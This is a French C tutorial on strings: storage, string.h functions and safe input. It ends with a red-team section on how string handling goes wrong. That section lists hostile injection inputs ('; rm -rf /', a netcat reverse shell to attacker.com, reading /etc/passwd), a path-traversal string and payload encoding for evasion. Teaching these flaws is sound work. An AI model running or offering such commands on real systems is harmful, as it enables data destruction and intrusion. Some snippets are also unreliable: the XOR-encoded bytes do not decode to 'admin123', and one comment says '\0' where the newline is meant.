# 09 - Strings (Chaînes de caractères)

## 🎯 Ce que tu vas apprendre

- Ce qu'est une string en C (tableau de char + '\0')
- Comment déclarer et manipuler des strings
- Les fonctions de la bibliothèque string.h
- Les dangers des strings (buffer overflow, format string)
- La différence entre chaînes mutables et immuables

## 📚 Théorie

### Concept 1 : C'est quoi une string en C ?

**C'est quoi ?**
En C, une **string** est un **tableau de caractères** terminé par le caractère spécial `'\0'` (null terminator).

**Pourquoi le '\0' ?**
Pour savoir où se termine la chaîne. Sans ça, impossible de savoir la longueur.

**Comment ça marche ?**

```c
char name[] = "Hello";
```

**En mémoire** :
```
┌───┬───┬───┬───┬───┬───┐
│ H │ e │ l │ l │ o │\0 │
└───┴───┴───┴───┴───┴───┘
 [0] [1] [2] [3] [4] [5]

Taille du tableau : 6 bytes
Longueur de la string : 5 caractères (sans '\0')
```

**Code ASCII** :
```
'H' = 0x48 = 72
'e' = 0x65 = 101
'l' = 0x6C = 108
'l' = 0x6C = 108
'o' = 0x6F = 111
'\0' = 0x00 = 0  ← Terminateur
```

**Pourquoi '\0' = 0 ?**
C'est le seul byte qui ne représente aucun caractère visible. Il marque la fin.

### Concept 2 : Déclaration et initialisation

**Méthode 1 : Avec double quotes** :
```c
char str[] = "Hello";  // Taille automatique : 6 bytes
```

**Méthode 2 : Taille explicite** :
```c
char str[10] = "Hello";  // 10 bytes alloués, 5 utilisés + '\0'
```

**Méthode 3 : Caractère par caractère** :
```c
char str[] = {'H', 'e', 'l', 'l', 'o', '\0'};  // Doit inclure '\0' !
```

**Méthode 4 : Pointeur vers string littérale (read-only)** :
```c
char* str = "Hello";  // ⚠️ NE PAS MODIFIER (segment read-only)
```

**Différence clé** :
```c
// Tableau (modifiable) :
char str1[] = "Hello";
str1[0] = 'h';  // OK : "hello"

// Pointeur vers littéral (non modifiable) :
char* str2 = "Hello";
str2[0] = 'h';  // CRASH (Segmentation fault) !
                // String littérale en segment read-only
```

**Représentation en mémoire** :
```
char str1[] = "Hello";  // Stack (modifiable)
┌──────────────┐
│ Stack        │
│ ┌───┬───┬───┐│
│ │ H │ e │...││  str1
│ └───┴───┴───┘│
└──────────────┘

char* str2 = "Hello";   // Pointeur → .rodata (read-only)
┌──────────────┐        ┌──────────────┐
│ Stack        │        │ .rodata      │
│ ┌──────────┐ │        │ ┌───┬───┬───┐│
│ │ 0x400500 │─┼──────> │ │ H │ e │...││
│ └──────────┘ │ str2   │ └───┴───┴───┘│
└──────────────┘        └──────────────┘
```

### Concept 3 : Affichage avec printf

```c
char name[] = "Alice";
printf("%s\n", name);  // %s pour afficher une string
```

**Afficher caractère par caractère** :
```c
for (int i = 0; name[i] != '\0'; i++) {
    printf("%c", name[i]);
}
printf("\n");
```

### Concept 4 : Lire une string

**Avec scanf (DANGEREUX)** :
```c
char username[50];
scanf("%s", username);  // ⚠️ Pas de limite → buffer overflow possible
```

**Avec scanf limité (mieux)** :
```c
char username[50];
scanf("%49s", username);  // Limite à 49 caractères (+ '\0')
```

**Avec fgets (RECOMMANDÉ)** :
```c
char username[50];
fgets(username, sizeof(username), stdin);  // Limite stricte
username[strcspn(username, "\n")] = '\0';  // Enlève le '\0'
```

### Concept 5 : Longueur d'une string - strlen()

**C'est quoi ?**
`strlen()` compte les caractères JUSQU'AU '\0' (sans le compter).

```c
#include <string.h>

char text[] = "Hello";
int len = strlen(text);  // 5 (sans le '\0')
```

**Comment ça marche en interne** :
```c
size_t my_strlen(const char* str) {
    size_t len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}
```

**Schéma** :
```
"Hello" :
┌───┬───┬───┬───┬───┬───┐
│ H │ e │ l │ l │ o │\0 │
└───┴───┴───┴───┴───┴───┘
 0   1   2   3   4   5

strlen() : Compte de [0] à [4] → 5
```

### Concept 6 : Copier une string - strcpy()

**C'est quoi ?**
Copie une string source dans une destination.

```c
#include <string.h>

char src[] = "Hello";
char dst[10];

strcpy(dst, src);  // Copie src dans dst (avec '\0')
printf("%s\n", dst);  // "Hello"
```

**Version sécurisée - strncpy()** :
```c
strncpy(dst, src, sizeof(dst) - 1);
dst[sizeof(dst) - 1] = '\0';  // Force '\0' à la fin
```

**Pourquoi strncpy est plus sûr ?**
```c
char dst[5];
strcpy(dst, "HelloWorld");   // OVERFLOW ! (10 chars dans 5 bytes)
strncpy(dst, "HelloWorld", 4);  // OK : copie seulement 4 chars
dst[4] = '\0';  // Ajoute '\0' manuellement
```

**⚠️ ATTENTION** : `strncpy` ne garantit PAS le '\0' final !

### Concept 7 : Concaténer des strings - strcat()

**C'est quoi ?**
Ajoute une string à la fin d'une autre.

```c
#include <string.h>

char str1[20] = "Hello";
char str2[] = " World";

strcat(str1, str2);  // str1 devient "Hello World"
printf("%s\n", str1);
```

**Schéma** :
```
Avant :
str1 : ┌───┬───┬───┬───┬───┬───┬───┬...─┐
       │ H │ e │ l │ l │ o │\0 │   │    │
       └───┴───┴───┴───┴───┴───┴───┴...─┘

str2 : ┌───┬───┬───┬───┬───┬───┬───┐
       │   │ W │ o │ r │ l │ d │\0 │
       └───┴───┴───┴───┴───┴───┴───┘

Après strcat(str1, str2) :
str1 : ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┐
       │ H │ e │ l │ l │ o │   │ W │ o │ r │ l │ d │\0 │
       └───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┘
```

**Version sécurisée - strncat()** :
```c
strncat(str1, str2, sizeof(str1) - strlen(str1) - 1);
```

### Concept 8 : Comparer des strings - strcmp()

**C'est quoi ?**
Compare deux strings caractère par caractère.

```c
#include <string.h>

char pass1[] = "admin123";
char pass2[] = "admin123";

if (strcmp(pass1, pass2) == 0) {
    printf("Identiques\n");
} else {
    printf("Différentes\n");
}
```

**Valeurs de retour** :
- `0` : strings identiques
- `< 0` : str1 < str2 (ordre alphabétique)
- `> 0` : str1 > str2

**⚠️ PIÈGE** : Ne PAS utiliser `==` pour comparer des strings !

```c
// FAUX :
if (str1 == str2) { ... }  // Compare les ADRESSES, pas le contenu

// CORRECT :
if (strcmp(str1, str2) == 0) { ... }
```

**Comment ça marche** :
```c
int my_strcmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}
```

### Concept 9 : Rechercher dans une string

**strchr() - Rechercher un caractère** :
```c
char text[] = "Hello World";
char* pos = strchr(text, 'W');  // Retourne pointeur vers 'W'

if (pos != NULL) {
    printf("Trouvé à : %s\n", pos);  // "World"
}
```

**strstr() - Rechercher une sous-chaîne** :
```c
char text[] = "Hello World";
char* found = strstr(text, "World");

if (found != NULL) {
    printf("Trouvé : %s\n", found);  // "World"
}
```

**Schéma strchr** :
```
text = "Hello World"
       ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┐
       │ H │ e │ l │ l │ o │   │ W │ o │ r │ l │ d │\0 │
       └───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┘
                                 ↑
                           strchr(text, 'W')
                           Retourne pointeur ici
```

### Concept 10 : Fonctions utiles de string.h

| Fonction | Description | Exemple |
|----------|-------------|---------|
| `strlen(str)` | Longueur (sans '\0') | `strlen("Hi")` → 2 |
| `strcpy(dst, src)` | Copier | `strcpy(a, "Hi")` |
| `strncpy(dst, src, n)` | Copier n chars | `strncpy(a, "Hi", 2)` |
| `strcat(dst, src)` | Concaténer | `strcat(a, "!")` |
| `strcmp(s1, s2)` | Comparer | `strcmp("a", "b")` → -1 |
| `strchr(str, c)` | Chercher caractère | `strchr("Hi", 'i')` |
| `strstr(str, sub)` | Chercher sous-chaîne | `strstr("Hello", "ell")` |
| `memset(ptr, val, n)` | Remplir n bytes | `memset(buf, 0, 100)` |
| `memcpy(dst, src, n)` | Copier n bytes | `memcpy(a, b, 10)` |

## 🔍 Visualisation : String littérale vs tableau

```c
char s1[] = "Hello";  // Tableau sur la stack
char* s2 = "Hello";   // Pointeur vers .rodata

printf("s1: %p\n", s1);  // Adresse stack (ex: 0x7fff...)
printf("s2: %p\n", s2);  // Adresse .rodata (ex: 0x400...)
```

**Mémoire** :
```
┌─────────────────┐
│ .rodata (read-only)
│ ┌───┬───┬───┬───┬───┬───┐
│ │ H │ e │ l │ l │ o │\0 │  ← "Hello" (littéral)
│ └───┴───┴───┴───┴───┴───┘
└────────────────────────────┘
                    ↑
                    │ s2 pointe ici
┌─────────────────┐ │
│ Stack           │ │
│ ┌──────────┐    │ │
│ │ 0x400... │────┘ │  s2 (pointeur)
│ └──────────┘      │
│ ┌───┬───┬───┬───┬───┬───┐
│ │ H │ e │ l │ l │ o │\0 │  s1 (tableau)
│ └───┴───┴───┴───┴───┴───┘
└────────────────────────────┘
```

## 🎯 Application Red Team

### 1. Command Injection

**Le danger** :
```c
char cmd[100] = "ping -c 1 ";
strcat(cmd, user_input);  // ⚠️ Dangereux !
system(cmd);

// Si user_input = "127.0.0.1; cat /etc/passwd"
// Exécute : ping -c 1 127.0.0.1; cat /etc/passwd
```

**Exploitation** :
```c
// Input malveillant :
"; rm -rf /"
"; nc attacker.com 4444 -e /bin/sh"
"$(whoami)"
"`id`"
```

### 2. Buffer Overflow via strcpy

```c
// Vulnérable :
char buffer[8];
strcpy(buffer, user_input);  // Si input > 7 chars → overflow

// Sécurisé :
char buffer[8];
strncpy(buffer, user_input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';
```

**Exploitation** :
```
buffer[8] en mémoire :
┌────┬────┬────┬────┬────┬────┬────┬────┐
│    │    │    │    │    │    │    │    │ buffer
└────┴────┴────┴────┴────┴────┴────┴────┘
                                          ↓ autres variables

Input malveillant : "AAAAAAAAAAAAAAAABBBB\x78\x56\x34\x12"

Après strcpy :
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬...─┬────┬────┬────┬────┐
│ A  │ A  │ A  │ A  │ A  │ A  │ A  │ A  │ A  │ A  │ B  │ B  │ B  │ B  │...
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
                                          ↑ OVERFLOW ↑
```

### 3. Format String Attack (rappel)

```c
// Vulnérable :
printf(user_input);  // ⚠️ TRÈS DANGEREUX

// Sécurisé :
printf("%s", user_input);
```

### 4. Path Traversal

```c
char filepath[256] = "/var/www/uploads/";
strcat(filepath, filename);  // filename vient de l'user

// Attaque :
// filename = "../../../etc/passwd"
// filepath = "/var/www/uploads/../../../etc/passwd"
//          = "/etc/passwd"
```

### 5. String encoding pour evasion

**Base64 encoding** :
```c
// Encoder un payload pour éviter détection
char payload[] = "malicious code";
char* encoded = base64_encode(payload);
send_to_server(encoded);
```

**ROT13** :
```c
void rot13(char* str) {
    for (int i = 0; str[i]; i++) {
        if (str[i] >= 'a' && str[i] <= 'z') {
            str[i] = ((str[i] - 'a' + 13) % 26) + 'a';
        } else if (str[i] >= 'A' && str[i] <= 'Z') {
            str[i] = ((str[i] - 'A' + 13) % 26) + 'A';
        }
    }
}
```

### 6. Obfuscation de strings

```c
// Au lieu de :
char password[] = "admin123";  // Visible dans le binaire

// Obfusquer :
unsigned char encoded[] = {0xCE, 0xCB, 0xCA, 0xC2, 0xDE, 0xD6, 0xD7, 0xD4};
for (int i = 0; i < 8; i++) {
    encoded[i] ^= 0xAA;  // Décode : "admin123"
}
```

### 7. String parsing pour exploitation

```c
// Parser une URL pour extraction
char url[] = "http://target.com:8080/admin?id=1";

char* host = strstr(url, "://") + 3;
char* port = strchr(host, ':');
char* path = strchr(host, '/');

if (port) {
    *port = '\0';
    port++;
    char* end = strchr(port, '/');
    if (end) *end = '\0';
    printf("Port: %s\n", port);  // 8080
}
```

### 8. Secure string comparison (timing attack resistant)

```c
// Vulnérable (timing attack) :
if (strcmp(password, input) == 0) { ... }

// Sécurisé (temps constant) :
int secure_strcmp(const char* a, const char* b, size_t len) {
    volatile unsigned char diff = 0;
    for (size_t i = 0; i < len; i++) {
        diff |= a[i] ^ b[i];
    }
    return diff;  // 0 si égales
}
```

## 📝 Points clés à retenir

- En C, une string = tableau de char terminé par '\0'
- '\0' est essentiel : marque la fin de la chaîne
- `strlen()` compte les caractères SANS le '\0'
- TOUJOURS vérifier la taille avant strcpy/strcat (risque d'overflow)
- Utiliser strncpy/strncat pour limiter la taille
- `strcmp()` pour comparer (PAS ==)
- String littérale = read-only, ne pas modifier
- Tableau de char = modifiable
- Les fonctions de string.h ne vérifient PAS les limites
- Les strings sont une source majeure de vulnérabilités (overflow, injection)

## ➡️ Prochaine étape

Maintenant que tu maîtrises les strings, tu vas apprendre à organiser ton code avec les [fonctions](../10_functions/)

---

**Exercices** : Voir [exercice.txt](exercice.txt)
**Code exemple** : Voir [example.c](example.c)
